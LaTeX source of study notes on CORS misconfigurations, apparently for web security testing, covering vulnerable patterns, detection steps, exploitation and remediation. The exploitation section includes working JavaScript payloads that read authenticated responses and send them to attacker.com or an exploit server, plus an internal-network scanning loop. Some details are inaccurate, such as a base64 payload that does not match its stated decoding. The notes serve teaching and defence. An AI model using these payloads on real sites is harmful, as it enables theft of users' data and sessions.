\documentclass{article}
\usepackage[utf8]{inputenc}
\usepackage[T1]{fontenc}
\usepackage{url}
\usepackage{graphicx}
\usepackage{geometry}
\usepackage{listings}
\usepackage{hyperref}
\usepackage{multicol}
\usepackage{array}
\usepackage{booktabs}
\usepackage{xcolor}
\lstset{numbers=none, basicstyle=\ttfamily}
\renewcommand{\lstlistingname}

\geometry{a4paper, left=20mm, right=20mm, top=20mm, bottom=20mm}
\title{Cross-Origin Resource Sharing (CORS) Vulnerability Notes}
\author{Eyad Islam El-Taher}

\begin{document}

\maketitle

\section*{Introduction}
\textbf{Cross-Origin Resource Sharing (CORS)} is a browser mechanism that enables controlled access to resources located outside of a given domain. It extends and adds flexibility to the \textbf{Same-Origin Policy (SOP)}, but also introduces potential attack vectors when poorly configured.

\subsection*{Key Concepts}
\begin{itemize}
    \item \textbf{Same-Origin Policy (SOP)}: Restrictive policy preventing websites from accessing resources from different origins
    \item \textbf{CORS}: Protocol that relaxes SOP using HTTP headers to define trusted web origins
    \item \textbf{Origin}: Combination of protocol, domain, and port (e.g., \texttt{https://example.com:443})
    \item \textbf{CORS is NOT protection} against CSRF attacks
\end{itemize}

\section*{CORS Vulnerability Happen When}
\begin{itemize}
    \item \textbf{Origin Reflection}: Server reflects arbitrary Origin header in \texttt{Access-Control-Allow-Origin}
    \item \textbf{Weak Whitelisting}: Improper regex/prefix/suffix matching in origin validation
    \item \textbf{Null Origin Trust}: Application whitelists \texttt{null} origin value
    \item \textbf{Credentials with Wildcard}:\newline
     \texttt{Access-Control-Allow-Credentials: true} \newline
     \texttt{Access-Control-Allow-Origin: *}
    \item \textbf{Subdomain Validation Flaws}: Poor subdomain validation allowing attacker-controlled domains
    \item \textbf{Protocol Mismatch}: HTTP vs HTTPS origin validation issues
\end{itemize}

\section*{CORS Vulnerability Happen Where}
\begin{itemize}
    \item \textbf{API Endpoints} returning sensitive user data
    \item \textbf{AJAX Requests} with authentication cookies
    \item \textbf{Cross-Domain Applications} requiring resource sharing
    \item \textbf{Mobile App Backends} with web interfaces
    \item \textbf{Third-Party Integrations} with relaxed CORS policies
    \item \textbf{Development Environments} with permissive settings in production
\end{itemize}

\section*{Impact of CORS Vulnerability}
\begin{itemize}
    \item \textbf{Sensitive Data Theft}: API keys, CSRF tokens, personal information
    \item \textbf{Credential Harvesting}: Session cookies, authentication tokens
    \item \textbf{Account Takeover}: Through stolen session data
    \item \textbf{Information Disclosure}: Business data, internal information
    \item \textbf{Privilege Escalation}: Access to privileged user data
\end{itemize}

\hrule

\section*{Advanced CORS Exploitation Scenarios}

\subsection*{\underline{Exploiting XSS via CORS Trust Relationships}}
\begin{itemize}
    \item \textbf{Scenario}: Website trusts an origin vulnerable to XSS
    \item \textbf{Attack}: Use XSS to inject JavaScript that leverages CORS to retrieve sensitive data
    \item \textbf{Example}:
    \begin{lstlisting}[basicstyle=\ttfamily\small, frame=single]
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: https://subdomain.vulnerable-website.com
Cookie: sessionid=...

Response:
Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
    \end{lstlisting}
    \item \textbf{Exploitation}: XSS payload on subdomain retrieves API key via CORS
\end{itemize}

\subsection*{\underline{Breaking TLS with Poorly Configured CORS}}

\subsection*{Understanding the Vulnerability}
\begin{itemize}
    \item \textbf{CORS Misconfiguration}: When a TLS-protected site (HTTPS) has overly permissive CORS policies
    \item \textbf{Attack Vector}: HTTP page can make requests to HTTPS site and read responses
    \item \textbf{Core Problem}: CORS policy allows requests from untrusted or HTTP origins
\end{itemize}

\subsection*{How the Attack Works}
\begin{verbatim}
Victim visits:    http://attacker-site.com (malicious page)
JavaScript on page makes request to: https://bank.com/api/userData
Browser checks CORS: 
    https://bank.com responds with: Access-Control-Allow-Origin: *
Browser allows: Malicious page reads sensitive data from HTTPS site
\end{verbatim}

\subsection*{Common Misconfigurations}
\begin{itemize}
    \item \texttt{Access-Control-Allow-Origin: *} on sensitive endpoints
    \item \texttt{Access-Control-Allow-Origin: null} which allows file:// origins
    \item Dynamic origin reflection without proper validation
    \item Allowing credentials with wildcard origins
\end{itemize}

\subsection*{Impact}
\begin{itemize}
    \item Bypass of TLS protection for sensitive data
    \item Cross-origin reading of authenticated responses
    \item Theft of CSRF tokens and session data
    \item Complete account takeover in severe cases
\end{itemize}

\subsection*{\underline{Intranet Exploitation via CORS Misconfiguration}}

Understanding CORS-Based Intranet Attacks:
\begin{itemize}
    \item \textbf{Attack Vector}: Leveraging misconfigured CORS policies on internal services
    \item \textbf{Privilege Escalation}: Using external access to reach internal network resources
    \item \textbf{Browser as Bridge}: Victim's browser becomes a proxy to internal systems
\end{itemize}

\subsection*{How CORS Enables Intranet Access}
\begin{verbatim}
External Attack Flow:
1. Victim visits: http://evil.com (malicious page)
2. JavaScript makes request to: http://internal-service.local/api/data
3. Internal service responds with: Access-Control-Allow-Origin: *
4. Browser allows: Malicious page reads internal service data
5. Attacker exfiltrates internal network information
\end{verbatim}

\subsection*{CORS-Specific Attack Techniques}
\begin{verbatim}
1. Internal Service Discovery via CORS:
   for (let i = 1; i < 255; i++) {
       fetch(`http://192.168.1.${i}/api/data`)
         .then(r => {
           if(r.headers.get('Access-Control-Allow-Origin')) {
             // Internal service found with CORS enabled
           }
         })
   }

2. Credentialed CORS Attacks:
   fetch('http://internal-app/private-data', {
     credentials: 'include'
   })
   // Works if internal app has: 
   // Access-Control-Allow-Credentials: true
   // Access-Control-Allow-Origin: evil.com
\end{verbatim}

\subsection*{Exploitation Impact via CORS}
\begin{itemize}
    \item \textbf{Internal Data Theft}: Read sensitive data from internal APIs
    \item \textbf{Service Enumeration}: Map internal network structure and services
    \item \textbf{Authentication Bypass}: Access internal apps using victim's browser context
    \item \textbf{Cross-Internal Service Attacks}: Use one internal service to attack others
    \item \textbf{Persistent Access}: Plant backdoors in internal systems
\end{itemize}

\subsection*{Real-World Attack Scenario}
\begin{verbatim}
1. Attacker finds XSS on external corporate site
2. Injects script that scans internal network (192.168.0.0/16)
3. Discovers internal Jenkins at 192.168.1.50 with CORS: *
4. Reads Jenkins build secrets, API keys, credentials
5. Uses credentials to access other internal systems
\end{verbatim}

\hrule

\section*{CORS Headers and Their Roles}

\subsection*{Request Headers}
\begin{itemize}
    \item \texttt{Origin}: Indicates the origin of the cross-origin request
    \item \texttt{Access-Control-Request-Method}: Used in preflight requests
    \item \texttt{Access-Control-Request-Headers}: Used in preflight requests
\end{itemize}

\subsection*{Response Headers}
\begin{itemize}
    \item \texttt{Access-Control-Allow-Origin}: Specifies allowed origins
    \item \texttt{Access-Control-Allow-Credentials}: Indicates if credentials are allowed
    \item \texttt{Access-Control-Allow-Methods}: Allowed HTTP methods
    \item \texttt{Access-Control-Allow-Headers}: Allowed HTTP headers
    \item \texttt{Access-Control-Expose-Headers}: Headers exposed to JavaScript
\end{itemize}

\hrule

\section*{Types of CORS Misconfigurations}

\subsection*{1.\underline{Basic Origin Reflection}}
\begin{itemize}
    \item \textbf{Vulnerability}: Server reflects any Origin header value
    \item \textbf{Exploitation}:
    \begin{lstlisting}[basicstyle=\ttfamily\small, frame=single]
    Request:
    GET /sensitive-data HTTP/1.1
    Origin: https://evil.com
    
    Response:
    HTTP/1.1 200 OK
    Access-Control-Allow-Origin: https://evil.com
    Access-Control-Allow-Credentials: true
    \end{lstlisting}
    \item \textbf{Impact}: Complete domain compromise
\end{itemize}

\subsection*{2. \underline{Weak Regex/Whitelist Bypass}}
\begin{itemize}
    \item \textbf{Common Flaws}:
    \begin{itemize}
        \item Prefix matching: \texttt{trusted.com} allows \texttt{trusted.com.evil.net}
        \item Suffix matching: \texttt{trusted.com} allows \texttt{eviltrusted.com}
        \item Regex errors: Poorly crafted regular expressions
    \end{itemize}
    \item \textbf{Exploitation Examples}:
    \begin{lstlisting}[basicstyle=\ttfamily\small, frame=single]
    Allowed: *.trusted.com
    Bypass: attacker.trusted.com
    
    Allowed: trusted.com.*
    Bypass: trusted.com.attacker.net
    \end{lstlisting}
\end{itemize}

\subsection*{3. \underline{Null Origin Vulnerability}}
\begin{itemize}
    \item \textbf{Null Origin}: A special origin value that appears as \texttt{null} in requests
    \item \textbf{Occurs When}: Requests come from local HTML files, sandboxed iframes, or certain redirects
    \item \textbf{CORS Impact}: If server allows \texttt{null} origin, it bypasses normal origin restrictions
\end{itemize}

\subsection*{How Null Origin Works}
\begin{verbatim}
Normal Browser Behavior:
- File:// URLs: Origin header is set to "null"
- Sandboxed iframes: Origin becomes "null"
- Some redirect scenarios: Origin may become "null"

Server Response:
If server responds with: Access-Control-Allow-Origin: null
Then any "null" origin can access the resource
\end{verbatim}

\textbf{Attack Vector}:
    \begin{lstlisting}[basicstyle=\ttfamily\small, frame=single]
    <iframe sandbox="allow-scripts allow-top-navigation allow-forms"
            srcdoc="<script>/* CORS attack */</script>">
    </iframe>
    \end{lstlisting}

\subsection*{Common Null Origin Scenarios}
\begin{itemize}
    \item \textbf{File Protocol}: \texttt{file:///C:/Users/ victim/attack.html}
    \item \textbf{Sandboxed Documents}: \texttt{<iframe sandbox="allow-scripts">}
    \item \textbf{Data URLs}: \texttt{data:text/html,<script>fetch()</script>}
    \item \textbf{Certain Redirects}: Origin may be stripped during redirects
\end{itemize}

\subsection*{4. \underline{Credentials with Wildcard}}
\begin{itemize}
    \item \textbf{Vulnerability}:\newline \texttt{Access-Control-Allow-Origin: *} \newline \texttt{Access-Control-Allow-Credentials: true}
     \item \textbf{Wildcard Character}: The asterisk symbol (*) meaning "any origin"
    \item \textbf{CORS Context}: \texttt{Access-Control-Allow-Origin: *} allows any website to make requests
    \item \textbf{Security Implication}: Complete bypass of same-origin policy for the endpoint
\end{itemize}

\hrule

\section*{How to Identify CORS Vulnerabilities}

\subsection*{Quick Detection Checklist}
\begin{itemize}
    \item \textbf{Origin Reflection Test}:
    \begin{lstlisting}[basicstyle=\ttfamily\small, frame=single]
    Request with: Origin: https://attacker.com
    Check if response contains: Access-Control-Allow-Origin: https://attacker.com
    \end{lstlisting}
    
    \item \textbf{Credentials Check}:
    \begin{lstlisting}[basicstyle=\ttfamily\small, frame=single]
    Look for: Access-Control-Allow-Credentials: true
    \end{lstlisting}
    
    \item \textbf{Null Origin Test}:
    \begin{lstlisting}[basicstyle=\ttfamily\small, frame=single]
    Request with: Origin: null
    Check if response contains: Access-Control-Allow-Origin: null
    \end{lstlisting}
    
    \item \textbf{Wildcard Check}:
    \begin{lstlisting}[basicstyle=\ttfamily\small, frame=single]
    Check if response contains: Access-Control-Allow-Origin: *
    \end{lstlisting}
\end{itemize}

\subsection*{Definitive Vulnerability Indicators}
\begin{itemize}
    \item \textbf{HIGH RISK}: Origin reflection + Credentials allowed
    \begin{lstlisting}[basicstyle=\ttfamily\small, frame=single]
    Access-Control-Allow-Origin: https://attacker.com
    Access-Control-Allow-Credentials: true
    \end{lstlisting}
    
    \item \textbf{HIGH RISK}: Null origin + Credentials allowed
    \begin{lstlisting}[basicstyle=\ttfamily\small, frame=single]
    Access-Control-Allow-Origin: null
    Access-Control-Allow-Credentials: true
    \end{lstlisting}
    
    \item \textbf{MEDIUM RISK}: Weak regex/whitelist bypass
    \begin{itemize}
        \item Prefix/suffix matching vulnerabilities
        \item Subdomain validation flaws
    \end{itemize}
    
    \item \textbf{LOW RISK}: Wildcard without credentials
    \begin{lstlisting}[basicstyle=\ttfamily\small, frame=single]
    Access-Control-Allow-Origin: *
    Access-Control-Allow-Credentials: false
    \end{lstlisting}
\end{itemize}

\subsection*{Burp Suite Testing Steps}
\begin{enumerate}
    \item Intercept request to sensitive endpoint
    \item Add/modify Origin header to attacker domain
    \item Check if ACAO header reflects your origin
    \item Verify if ACAC header is set to true
    \item If both conditions met → VULNERABLE
\end{enumerate}

\subsection*{False Positive Checks}
\begin{itemize}
    \item \textbf{Not Vulnerable}: Server returns 403/error for unknown origins
    \item \textbf{Not Vulnerable}: No CORS headers in response
    \item \textbf{Not Vulnerable}: Static ACAO value (not reflecting origin)
    \item \textbf{Caution}: Some frameworks reflect origin only for preflight requests
\end{itemize}

\hrule

\section*{Testing Methodology}

\subsection*{Manual Testing Steps}
\begin{enumerate}
    \item \textbf{Identify CORS Endpoints}
    \begin{itemize}
        \item Use proxy to crawl application
        \item Look for \texttt{Access-Control-Allow-*} headers in responses
        \item Focus on endpoints returning sensitive data
    \end{itemize}
    
    \item \textbf{Test Origin Reflection}
    \begin{lstlisting}[basicstyle=\ttfamily\small, frame=single]
    Origin: https://evil.com
    Check for: Access-Control-Allow-Origin: https://evil.com
    \end{lstlisting}
    
    \item \textbf{Test Null Origin}
    \begin{lstlisting}[basicstyle=\ttfamily\small, frame=single]
    Origin: null
    Check for: Access-Control-Allow-Origin: null
    \end{lstlisting}
    
    \newpage
    \item \textbf{Test Whitelist Bypasses}
    \begin{itemize}
        \item Domain variations: \texttt{target.com.attacker.net}
        \item Case variations: \texttt{TARGET.com}
        \item Special characters: \texttt{target.com@attacker.net}
    \end{itemize}
    
    \item \textbf{Verify Credentials Support}
    \begin{lstlisting}[basicstyle=\ttfamily\small, frame=single]
    Check for: Access-Control-Allow-Credentials: true
    \end{lstlisting}
\end{enumerate}

\hrule

\section*{Exploitation Techniques}

\subsection*{Basic CORS Exploit Script}
\begin{lstlisting}[basicstyle=\ttfamily\small, frame=single]
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable.com/sensitive-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
    fetch('https://attacker.com/log?data=' + encodeURIComponent(this.responseText));
};
</script>
\end{lstlisting}

\subsection*{Common Null Origin Scenarios with Exploitation Examples}
\begin{itemize}
    \item \textbf{File Protocol}: 
    \begin{lstlisting}[basicstyle=\ttfamily\small, frame=single]
    User downloads and opens: attack.html
    File location: file:///C:/Users/john/Downloads/attack.html
    HTML content:
    <script>
    fetch('https://bank.com/api/account', {
      credentials: 'include'
    })
    .then(r => r.json())
    .then(data => {
      // Steal account data
      fetch('https://attacker.com/log?data=' + btoa(JSON.stringify(data)))
    });
    </script>
    \end{lstlisting}
    
    \item \textbf{Sandboxed Documents}:
    \begin{lstlisting}[basicstyle=\ttfamily\small, frame=single]
    <!-- Attacker embeds in their website -->
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
     srcdoc="<script>
     var req = new XMLHttpRequest();
     req.onload = function() {
       location='https://attacker.com/log?key='+encodeURIComponent(this.responseText);
     };
     req.open('get','https://vulnerable.com/data',true);
     req.withCredentials = true;
     req.send();
     </script>">
</iframe>
    \end{lstlisting}
    
    \newpage
    \item \textbf{Data URLs}:
    \begin{lstlisting}[basicstyle=\ttfamily\small, frame=single]
    <!-- Direct link user can click -->
    <a href="data:text/html;base64,PHNjcmlwdD4KZmV0Y2goJ2h0dHBzOi8vdGFyZ2V0LmNvbS
    9hcGkvdXNlckRhdGEnKQoudGhlbihyID0+IHIuanNvbigpKQoudGhlbihkYXRhID0+IHsKICBmZXR
    jaCgnaHR0cHM6Ly9hdHRhY2tlci5jb20vc3RlYWw/JytCVUYuc3RyaW5naWZ5KGRhdGEpKQp9KTsK
    PC9zY3JpcHQ+">
    Click for "Important Report"
    </a>
    
    Decoded base64 content:
    <script>
    fetch('https://target.com/api/userData')
    .then(r => r.json())
    .then(data => {
      fetch('https://attacker.com/steal?'+JSON.stringify(data))
    });
    </script>
    \end{lstlisting}
    
    \item \textbf{Certain Redirects}:
    \begin{lstlisting}[basicstyle=\ttfamily\small, frame=single]
    Attacker controls: https://evil.com/redirector
    Victim visits: https://evil.com/redirector?url=https://target.com/api/data
    
    Server code at evil.com:
    app.get('/redirector', (req, res) => {
      // This redirect strips the Origin header
      res.redirect(req.query.url);
    });
    
    Browser behavior:
    - Initial request Origin: https://evil.com
    - After redirect Origin: null
    - If target.com allows null origin, data is accessible
    \end{lstlisting}
\end{itemize}

\subsection*{Practical Exploitation Example (XSS \& CORS)}
\begin{itemize}
    \item \textbf{Reconnaissance}:
    \begin{itemize}
        \item Identify CORS-enabled endpoints with credentials
        \item Test origin reflection with arbitrary subdomains
        \item Find XSS vulnerabilities on whitelisted subdomains
    \end{itemize}
    \item \textbf{Exploit Chain}:
    \begin{lstlisting}[basicstyle=\ttfamily\small, frame=single]
<script>
document.location="http://stock.lab-id/?productId=4<script>
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://lab-id/accountDetails',true); 
req.withCredentials = true;
req.send();
function reqListener() {
    location='https://exploit-server/log?key='+this.responseText; 
};</script>&storeId=1"
</script>
    \end{lstlisting}
\end{itemize}

\newpage

\section*{Remediation and Prevention Measures}

\subsubsection*{1. Proper Cross-Origin Request Configuration}
\begin{itemize}
    \item \textbf{Sensitive Resources}: Always specify exact origins in \texttt{Access-Control-Allow-Origin} header
    \item \textbf{No Dynamic Reflection}: Never reflect arbitrary \texttt{Origin} headers without validation
    \item \textbf{Static Configuration}: Use fixed, pre-approved origins for sensitive endpoints
	\item \textbf{Protocol Consistency}: Ensure whitelisted origins use same protocol (HTTPS only)
    \item \textbf{Credential Control}: Use \texttt{Access-Control-Allow-Credentials: true} sparingly
\end{itemize}

\subsubsection*{2. Trusted Sites Only}
\begin{itemize}
    \item \textbf{Whitelist Management}: Only include genuinely trusted sites in CORS policies
    \item \textbf{Origin Verification}: Validate all whitelisted origins thoroughly
    \item \textbf{No Blind Trust}: Don't trust origins without proper security assessment
\end{itemize}

\subsubsection*{3. Avoid Null Origin Whitelisting}
\begin{itemize}
    \item \textbf{Null Origin Risk}: Internal documents and sandboxed requests can use \texttt{null} origin
    \item \textbf{Prevention}: Never use \texttt{Access-Control-Allow-Origin: null}
    \item \textbf{Alternative}: Specify exact trusted origins for both private and public servers
\end{itemize}

\subsubsection*{4. Internal Network Security}
\begin{itemize}
    \item \textbf{Wildcard Restriction}: Avoid wildcards (\texttt{*}) in internal networks
    \item \textbf{Network Isolation}: Don't rely solely on network configuration for protection
    \item \textbf{Browser Security}: Assume internal browsers can access untrusted external domains
\end{itemize}

\subsubsection*{5. Server-Side Security First}
\begin{itemize}
    \item \textbf{CORS Limitation}: CORS defines browser behavior only, not server protection
    \item \textbf{Direct Request Risk}: Attackers can forge requests from any trusted origin
    \item \textbf{Essential Protections}:
    \begin{itemize}
        \item Strong authentication mechanisms
        \item Robust session management
        \item Proper authorization checks
        \item Input validation and sanitization
    \end{itemize}
    \item \textbf{Layered Security}: CORS should complement, not replace, server-side security
\end{itemize}

\end{document}